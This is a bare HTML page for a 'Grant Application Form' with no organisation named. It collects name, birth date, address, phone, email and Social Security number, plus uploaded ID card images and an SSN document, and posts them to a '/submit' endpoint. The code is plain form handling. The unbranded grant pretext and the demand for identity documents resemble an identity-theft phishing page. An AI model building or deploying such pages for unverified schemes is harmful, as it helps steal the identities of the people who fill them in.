<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Grant Application</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <h1>Grant Application Form</h1>
        <form id="application-form">
            <label>Full Name:</label>
            <input type="text" id="fullName" placeholder="Enter your full name" required>

            <label>Date of Birth:</label>
            <input type="date" id="dob" placeholder="Select your date of birth" required>

            <label>Home Address:</label>
            <input type="text" id="homeAddress" placeholder="Enter your home address" required>

            <label>Phone Number:</label>
            <input type="tel" id="phoneNumber" placeholder="Enter your phone number" required>

            <label>Email:</label>
            <input type="email" id="email" placeholder="Enter your email address" required>

            <label>SSN:</label>
            <input type="text" id="ssn" placeholder="Enter your SSN" required>

            <label>ID Card Front:</label>
            <input type="file" id="idCardFront" required>

            <label>ID Card Back:</label>
            <input type="file" id="idCardBack" required>

            <label>SSN Document:</label>
            <input type="file" id="ssnDocument" required>

            <button type="submit">Submit Application</button>
        </form>
    </div>

    <script>
        document.getElementById('application-form').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const formData = new FormData();
            formData.append('fullName', document.getElementById('fullName').value);
            formData.append('dob', document.getElementById('dob').value);
            formData.append('homeAddress', document.getElementById('homeAddress').value);
            formData.append('phoneNumber', document.getElementById('phoneNumber').value);
            formData.append('email', document.getElementById('email').value);
            formData.append('ssn', document.getElementById('ssn').value);
            formData.append('idCardFront', document.getElementById('idCardFront').files[0]);
            formData.append('idCardBack', document.getElementById('idCardBack').files[0]);
            formData.append('ssnDocument', document.getElementById('ssnDocument').files[0]);

            fetch('/submit', {
                method: 'POST',
                body: formData
            })
            .then(res => res.json())
            .then(data => alert(data.message))
            .catch(err => console.error(err));
        });
    </script>
</body>
</html>
